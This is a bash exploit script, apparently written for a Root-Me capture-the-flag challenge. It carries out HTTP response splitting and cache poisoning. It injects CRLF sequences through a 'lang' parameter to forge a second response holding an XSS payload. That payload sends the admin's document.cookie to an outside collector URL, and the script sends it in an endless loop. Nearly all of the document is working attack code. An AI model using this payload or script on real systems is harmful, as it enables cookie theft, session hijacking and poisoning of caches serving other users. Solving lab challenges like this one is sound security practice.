#!/bin/bash

echo -e "\t\t HTTP Response Splitting\n"

# TEST AVEC: bash exploit.sh http://challenge01.root-me.org 58002 https://requestb.in/1kihisc1

# (ip.dst == 212.129.38.224 || ip.src == 212.129.38.224) && http
# Attaque type Crossing Wires
# repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20Response%20Splitting%20-%20Divide%20and%20Conquer.pdf
# Page 18/19

if [ $# -ne 3 ]
then
    echo -e "Usage: bash ${0##*/} <url> <port> <receiver>"
    exit 1
fi

#####################################################

testUrl=$(nslookup $1 | grep "can't find")
if [ ${#testUrl} -gt 0 ]
then
    echo -e "$1 is unreachable!"
    exit 1
fi

testPort=$2

if [ $testPort -gt 65535 ] || [ $testPort -lt 0 ]
then
    echo -e "$2 is incorrect!"
    exit 1
fi

#####################################################
URL=$1
PORT=$2
RECEIVER=$3
COOKIE="cookie.txt"

echo -e "[+] Attacking ${URL}:${PORT}"

#####################################################
# STEP 1: CLEANING CACHE
# STEP 2: SEND HTTP SPLITTING REQUEST
# STEP 3: SEND INNONCENT REQUEST

admin="/admin"
lang="/user/param?lang=fr"

# STEP 1: CLEANING CACHE

echo -e "\t[-] EMPTYING CACHE FOR ${URL}${admin}"
curl -s -c "${COOKIE}" -H "Cache-Control: no-cache" -X GET "${URL}:${PORT}${admin}" > /dev/null

# STEP 2: SEND HTTP SPLITTING REQUEST

echo -e "\t[-] SENDING EXPLOIT AT ${URL}:${PORT}${lang}"

: "
INJECTION XSS TYPE:
<html>
<script>
document.write('<img src=${RECEIVER}?cookie='+document.cookie+'/>');
</script>
</html>

---> On recupere le cookie ADMIN en faite
"
xss="%3Chtml%3E%3Cscript%3Edocument.write%28%27%3Cimg%20src=%5C%22${RECEIVER}?cookie=%27+document.cookie+%27%5C%22%3E%27%29%3B%3C%2Fscript%3E%3C%2Fhtml%3E"
exploit="%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20${#xss}%0d%0a%0d%0a${xss}"
while [ true ]
do   
    curl -s -b "${COOKIE}" -X GET "${URL}:${PORT}${lang}${exploit}" > /dev/null
    echo -e "\t\t[-] Sending..."
    sleep 1
done 



# STEP 3: SEND INNONCENT REQUEST

echo -e "\t[-] SENDING INNONCENT REQUEST FOR ${URL}:${PORT}${admin}"
curl -s -b "${COOKIE}" -X GET "${URL}:${PORT}${admin}" > /dev/null

# STEP 4: PROFIT
echo -e "[+] Please check: ${RECEIVER} anytime soon"

rm $COOKIE
exit 1
